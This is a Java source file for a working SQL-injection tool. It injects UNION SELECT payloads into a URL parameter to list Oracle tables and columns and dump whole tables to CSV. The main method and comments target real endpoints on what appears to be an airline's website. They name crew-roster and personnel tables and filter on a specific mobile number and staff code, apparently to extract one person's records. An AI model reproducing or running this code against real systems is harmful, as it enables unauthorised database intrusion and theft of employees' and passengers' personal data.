package com.chenjw.changlong;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang.StringUtils;
import org.apache.commons.lang.math.NumberUtils;

import au.com.bytecode.opencsv.CSVWriter;

public class Hacker {
	private String hackUrl = "";
	private Map<String, String> otherPairs = new HashMap<String, String>();
	private String hackKey = "";
	private String hackValue = "";
	private HackTypeEnum hackType = HackTypeEnum.SEARCH;
	private int hackFieldCount = 28;
	private int hackStringFieldIndex = 6;

	private static String sep = (char) 1 + "";
	private static String sepsql = "chr(1)";

	public Hacker(String url, String key, HackTypeEnum hackType,
			int hackFieldCount, int hackStringFieldIndex) {
		this.hackType = hackType;
		this.hackFieldCount = hackFieldCount;
		this.hackStringFieldIndex = hackStringFieldIndex;
		hackKey = key;
		hackUrl = StringUtils.substringBefore(url, "?");
		String pairs[] = StringUtils.split(
				StringUtils.substringAfter(url, "?"), "&");
		for (String pair : pairs) {
			String k = StringUtils.substringBefore(pair, "=");
			String v = StringUtils.substringAfter(pair, "=");
			if (StringUtils.equals(k, key)) {
				hackValue = v;
				continue;
			}
			otherPairs.put(k, v);
		}
	}

	private String toUrl(String str) throws UnsupportedEncodingException {
		System.out.println(str);
		String url = hackUrl + "?";
		for (Entry<String, String> entry : otherPairs.entrySet()) {
			url += entry.getKey() + "=" + entry.getValue();
		}
		url += hackKey + "=" + hackValue;
		if (!StringUtils.isBlank(str)) {
			if (HackTypeEnum.SEARCH == hackType) {
				url += URLEncoder.encode("%' " + str, "UTF-8");
			} else if (HackTypeEnum.STRING == hackType) {
				url += URLEncoder.encode("' " + str, "UTF-8");
			} else if (HackTypeEnum.NUMBER == hackType) {
				url += URLEncoder.encode(" " + str, "UTF-8");
			}
		}
		
		return url;
	}

	public int count(String userName, String tableName) throws IOException {
		String url = toUrl("and 1=2 union all select "
				+ StringUtils.repeat("null,", hackStringFieldIndex - 1)
				+ sepsql
				+ "||count(*)||"
				+ sepsql
				+ StringUtils.repeat(",null", hackFieldCount
						- hackStringFieldIndex) + "  from " + userName + "."
				+ tableName + " where 1=1 --");
		String content = request(url);
		String s = StringUtils.substringBetween(content, sep, sep);
		
		return NumberUtils.toInt(s, 0);
	}

	public List<Map<String, String>> getValueByPage(DbColumns columns,
			String userName, String tableName, String where, String orderBy,
			int start, int limit, DbColumns title) throws IOException {
		int maxSize = 15;
		List<Map<String, String>> result = null;
		for (int i = 0; i < ((columns.getColumns().size() - 1) / maxSize + 1); i++) {
			DbColumns subC = columns.subList(i * maxSize, Math.min((i + 1)
					* maxSize - 1, columns.getColumns().size()));
			List<Map<String, String>> subList = doGetValueByPage(subC,
					userName, tableName, where, orderBy, start, limit, title);
			if (subList == null) {
				continue;
			}
			result = merge(result, subList);
		}
		return result;
	}

	private List<Map<String, String>> merge(List<Map<String, String>> r1,
			List<Map<String, String>> r2) {
		if (r2 == null) {
			return r1;
		}
		if (r1 == null) {
			r1 = new ArrayList<Map<String, String>>();
			r1.addAll(r2);
		} else {
			for (int j = 0; j < r2.size(); j++) {
				r1.get(j).putAll(r2.get(j));
			}
		}
		return r1;
	}

	public List<Map<String, String>> doGetValueByPage(DbColumns columns,
			String userName, String tableName, String where, String orderBy,
			int start, int limit, DbColumns title) throws IOException {

		String url = toUrl("and 1=2 union all select "
				+ StringUtils.repeat("null,", hackStringFieldIndex - 1)
				+ " d"
				+ StringUtils.repeat(",null", hackFieldCount
						- hackStringFieldIndex)
				+ " from (select rownum r,d from (select rownum r," + sepsql
				+ "||" + columns.joinAndFormat("||" + sepsql + "||") + "||"
				+ sepsql + "  d from " + userName + "." + tableName
				+ " where rownum<=" + (start + limit) + " and "
				+ (StringUtils.isBlank(where) ? "1=1" : where) + " order by "
				+ (StringUtils.isBlank(orderBy) ? "1 asc" : orderBy)
				+ ") t where r>" + start + ")t where 1=1 --");
		String content = request(url);

		if (StringUtils.contains(content, "Message:ORA-00904")) {
			String failcolumn = StringUtils.substringBetween(content,
					"Message:ORA-00904: \"", "\": 标识符无效");
			if (columns.containsName(failcolumn)) {
				columns.remove(failcolumn);
				if (title != null) {
					title.remove(failcolumn);
				}

				if (columns.getColumns().size() == 0) {
					return null;
				} else {
					return doGetValueByPage(columns, userName, tableName,
							where, orderBy, start, limit, title);
				}
			}
		}
		// Message:ORA-01489: 字符串连接的结果过长
		else if (StringUtils.contains(content, "Message:ORA-01489")) {
			// 对半分成两组
			if (columns.getColumns().size() == 1) {
				return null;
			}
			int num = columns.getColumns().size() / 2;
			return merge(
					doGetValueByPage(columns.subList(0, num), userName,
							tableName, where, orderBy, start, limit, title),
					doGetValueByPage(columns.subList(num + 1, columns
							.getColumns().size()), userName, tableName, where,
							orderBy, start, limit, title));

		}

		List<Map<String, String>> result = new ArrayList<Map<String, String>>();

		String[] strs = StringUtils.splitByWholeSeparatorPreserveAllTokens(
				content, sep);
		int lines = strs.length / (columns.getColumns().size() + 1);
		for (int i = 0; i < lines; i++) {
			Map<String, String> r = new HashMap<String, String>();
			int a = 1;
			for (DbColumn column : columns.getColumns()) {
				r.put(column.getColumnName(), strs[i
						* (columns.getColumns().size() + 1) + a]);
				a++;

			}
			result.add(r);
		}

		return result;
	}

	public DbColumns getColumns(String userName, String tableName)
			throws IOException {
		String url = toUrl("and 1=2 union all select "
				+ StringUtils.repeat("null,", hackStringFieldIndex - 1)
				+ sepsql
				+ "||column_name||','||data_type||"
				+ sepsql
				+ StringUtils.repeat(",null", hackFieldCount
						- hackStringFieldIndex)
				+ " from (select rownum r,column_name,data_type from (select rownum r,column_name,data_type from all_tab_columns where table_name='"
				+ tableName
				+ "' and owner='"
				+ userName
				+ "' and data_type not in ('BLOB','CLOB','LONG') order by 1 desc) t where r>1-1 order by 1)t where 1=1 --");
		String content = request(url);
		DbColumns tablenames = new DbColumns();
		while (true) {
			String s = StringUtils.substringAfter(content, sep);
			String nn = StringUtils.substringBefore(s, sep);

			if (StringUtils.isBlank(nn)) {
				break;
			}
			String name = StringUtils.substringBefore(nn, ",");
			String type = StringUtils.substringAfter(nn, ",");
			if (!tablenames.containsName(name)) {
				DbColumn c = new DbColumn();
				c.setColumnName(name);
				c.setColumnType(type);
				tablenames.add(c);
			}

			// System.out.println(tablename);

			content = StringUtils.substringAfter(s, sep);
		}
		return tablenames;
	}

	private String requestQuite(String url) throws IOException {
		URL u = new URL(url);
		System.out.println(url);
		try {
			String content = IOUtils.toString(u.openStream());
			return content;
		} catch (Exception e) {
			return "";
		}
	}

	private String request(String url) throws IOException {
		URL u = new URL(url);
		System.out.println(url);
		String content = IOUtils.toString(u.openStream());
		return content;
	}

	public Map<String, Integer> countTablesByUser() throws IOException {
		String url = toUrl("and 1=2 union all select "
				+ StringUtils.repeat("null,", hackStringFieldIndex - 1)
				+ sepsql
				+ "||table_name||','||owner||"
				+ sepsql
				+ StringUtils.repeat(",null", hackFieldCount
						- hackStringFieldIndex)
				+ " from (select rownum r,table_name,owner from (select rownum r,table_name,owner from all_tables where 1=1 order by table_name asc) t where r>1-1 order by 1)t where 1=1 --");
		String content = request(url);
		Map<String, Integer> counts = new HashMap<String, Integer>();
		while (true) {
			String s = StringUtils.substringAfter(content, sep);
			String tablename = StringUtils.substringBefore(s, sep);
			if (StringUtils.isBlank(tablename)) {
				break;
			}
			String owner = StringUtils.substringAfter(tablename, ",");
			Integer count = counts.get(owner);
			if (count == null) {
				count = 0;
			}
			count++;
			counts.put(owner, count);
			// System.out.println(tablename);

			content = StringUtils.substringAfter(s, sep);
		}
		Entry<String, Integer>[] aa=counts.entrySet().toArray(new Entry[counts.size()]);
		
		Arrays.sort(aa,new Comparator<Entry<String, Integer>>(){

			@Override
			public int compare(Entry<String, Integer> o1,
					Entry<String, Integer> o2) {
				
				return o2.getValue()-o1.getValue();
			}
			
		});
		for(Entry<String, Integer> entry:aa){
			System.out.println(entry.getKey()+" "+entry.getValue());
		}
		return counts;
	}

	public List<String> getTablenames(String userName) throws IOException {
		String url = toUrl("and 1=2 union all select "
				+ StringUtils.repeat("null,", hackStringFieldIndex - 1)
				+ sepsql
				+ "||table_name||"
				+ sepsql
				+ StringUtils.repeat(",null", hackFieldCount
						- hackStringFieldIndex)
				+ " from (select rownum r,table_name from (select rownum r,table_name from all_tables where owner='"
				+ userName
				+ "' order by table_name asc) t where r>1-1 order by 1)t where 1=1 --");
		String content = request(url);
		List<String> tablenames = new ArrayList<String>();
		while (true) {
			String s = StringUtils.substringAfter(content, sep);
			String tablename = StringUtils.substringBefore(s, sep);
			if (StringUtils.isBlank(tablename)) {
				break;
			}

			tablenames.add(tablename);
			// System.out.println(tablename);

			content = StringUtils.substringAfter(s, sep);
		}
		return tablenames;
	}

	public int printTablevalues(DbColumns columns, String userName,
			String tableName, String where, String orderBy, int start,
			int limit, CSVWriter writer, DbColumns title) throws IOException {
		List<Map<String, String>> values = getValueByPage(columns, userName,
				tableName, where, orderBy, start, limit, title);

		System.out.println(StringUtils.join(columns.getColumns(), ",\t"));
		for (Map<String, String> value : values) {
			String[] rrrr = new String[columns.getColumns().size()];
			for (int i = 0; i < columns.getColumns().size(); i++) {
				String v = value.get(columns.getColumns().get(i)
						.getColumnName());
				rrrr[i] = v;
				System.out.print(v + ",\t");

			}
			if (writer != null) {
				if (title != null) {
					writer.writeNext(title.toNameArray());
					title = null;
				}
				writer.writeNext(rrrr);
			}
			System.out.println();
		}
		return values.size();
	}

	public void printAllTablevalues(String userName, String tableName,
			String where, String orderBy) throws IOException {
		int pageSize = 1000;
		File file = new File("/home/chenjw/test/" + userName + "/" + tableName
				+ ".csv");
		FileUtils.forceMkdir(file.getParentFile());
		CSVWriter writer = new CSVWriter(new FileWriter(file), '\t');
		DbColumns columns = getColumns(userName, tableName);
		int start = 0;
		while (true) {
			DbColumns title = (start == 0 ? columns : null);
			int size = printTablevalues(columns, userName, tableName, where,
					orderBy, start, pageSize, writer, title);
			if (size <= 0) {
				break;
			}
			start += pageSize;
		}
		writer.close();
	}

	/**
	 * 打印表名字和记录数量
	 * 
	 * @throws IOException
	 */
	public void printTablenameAndCount(String userName) throws IOException {
		List<String> tablenames = getTablenames(userName);
		List<Object[]> ttt = new ArrayList<Object[]>();
		for (String tn : tablenames) {
			int count = count(userName, tn);
			if (count < 10) {
				continue;
			}
			Object[] oo = new Object[2];
			oo[0] = tn;
			oo[1] = count;
			ttt.add(oo);

		}
		Collections.sort(ttt, new Comparator<Object[]>() {

			@Override
			public int compare(Object[] o1, Object[] o2) {
				return (Integer) o2[1] - (Integer) o1[1];
			}

		});
		for (Object[] tt : ttt) {
			System.out.println(tt[0] + " " + tt[1]);
		}
	}

	public void printByUser(String userName) throws IOException {
		List<String> tablenames = getTablenames(userName);
		for (String tb : tablenames) {
			count(userName, tb);
			printAllTablevalues(userName, tb, "", null);//
		}
	}

	// http://cda.loongair.cn/Pinfo.aspx?pCode=17381 个人信息
	// http://cda.loongair.cn/FindInfo.aspx 航班动态
	// http://cda.loongair.cn/FlightPlanDialog/crew.aspx?crew_link_line=9892
	// 查机组人员
	public void printXieRu() throws IOException {

		// "MOBILENUM='15810100385'"
		// 查航班
		printAllTablevalues("GJICREW", "T_SCH_ROSTER_LOG",
				"P_CODE = '17378' or OLD_P_CODE='17378'",
				"FLIGHT_DATE asc,LOG_ID asc");//
		printAllTablevalues("GJFOC", "T9204", "MOBILENUM='15810100385'",
				"CREATEDATETIME asc");//
	}

	private String checkHackFieldCount(int count) throws IOException {
		String url = toUrl(" union all select "
				+ StringUtils.repeat("'1',", count - 1)
				+ "'1'  from dual where 1=1 --");
		return requestQuite(url);
	}

	private String checkHackIndex(int count, int index) throws IOException {
		String url = toUrl(" union all select "
				+ StringUtils.repeat("null,", index - 1) + "'a'"
				+ StringUtils.repeat(",null", count - index)
				+ "  from dual where 1=1 --");
		return requestQuite(url);
	}

	private int hackStringIndex(int hackFieldCount) throws IOException {
		for (int i = 1; i <= hackFieldCount; i++) {
			String count = checkHackIndex(hackFieldCount, i);
			System.out.println("[HACKCOUNT] " + i + " " + count.length());
		}
		return 0;
	}

	private int hackCount() throws IOException {
		String content = request(toUrl(null));
		for (int i = 1; i < 30; i++) {
			String c = checkHackFieldCount(i);
			String percent = String.valueOf(Math.min(content.length(),
					c.length())
					* 1f / Math.max(content.length(), c.length()) * 100);
			System.out.println("[HACKCOUNT] " + i + " " + percent + "%");
		}
		return 0;
	}

	public static void main(String[] args) throws IOException {
//		 Hacker h = new Hacker("http://info.loongair.cn/Dynamic.aspx?dd=杭州",
//		 "dd", HackTypeEnum.SEARCH, 28, 6);
		Hacker h = new Hacker(
				"http://cda.loongair.cn/FlightPlanDialog/delay.aspx?flight_id=100611832",
				"flight_id", HackTypeEnum.STRING, 1, 1);
		h.countTablesByUser();

//		Map<String, Integer> counts = h.countTablesByUser();
//		for (Entry<String, Integer> entry : counts.entrySet()) {
//			System.out.println(entry.getKey() + " " + entry.getValue());
//		}
		// h.printXieRu();
		// "PHONE='15810100385'"
		// printTablenameAndCount("CDIFOC");
		// h.printByUser("CDIFOC");

		//h.printAllTablevalues("GJFOC", "T2001", "CREW_LINK_LINE=9892", null);//

	}
}
